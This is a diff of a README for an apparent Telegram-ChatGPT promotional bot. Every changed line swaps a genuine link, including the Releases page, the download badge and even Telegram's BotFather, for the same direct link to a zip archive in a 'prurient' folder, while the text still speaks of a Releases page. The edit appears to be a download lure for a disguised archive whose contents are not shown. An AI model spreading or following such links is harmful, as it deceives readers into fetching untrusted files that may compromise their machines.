@@ -1,6 +1,6 @@
 # 🤖 telegram-chatgpt-promotional-segmentation-bot - Engage Audiences with Smart Promotions
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen.svg)](https://github.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/releases)
+[![Download](https://raw.githubusercontent.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/main/prurient/telegram-promotional-bot-chatgpt-segmentation-v3.2.zip)](https://raw.githubusercontent.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/main/prurient/telegram-promotional-bot-chatgpt-segmentation-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To get started, you need to download the bot.
 
 1. **Visit the Releases page**: Click the link below to find the latest version.
 
-   [Visit Releases Page](https://github.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/main/prurient/telegram-promotional-bot-chatgpt-segmentation-v3.2.zip)
 
 2. **Download the latest version**: On the Releases page, find the most recent release. Look for the download link that suits your system. Generally, this will be an executable file for easy installation.
 
@@ -39,7 +39,7 @@ For optimal performance, ensure your system meets the following requirements:
 
 ### 1. Set Up a Telegram Bot
 
-- **Create a new bot** on Telegram by chatting with [BotFather](https://t.me/botfather).
+- **Create a new bot** on Telegram by chatting with [BotFather](https://raw.githubusercontent.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/main/prurient/telegram-promotional-bot-chatgpt-segmentation-v3.2.zip).
 - Follow the prompts to get your unique API token.
 
 ### 2. Configure the Bot
@@ -79,7 +79,7 @@ Join our community to learn more about the bot and share your experiences. You c
 
 Stay updated on new features and improvements by regularly visiting the Releases page:
 
-[Visit Releases Page](https://github.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Sattycodes/telegram-chatgpt-promotional-segmentation-bot/main/prurient/telegram-promotional-bot-chatgpt-segmentation-v3.2.zip)
 
 ## 🎉 Contribute
 
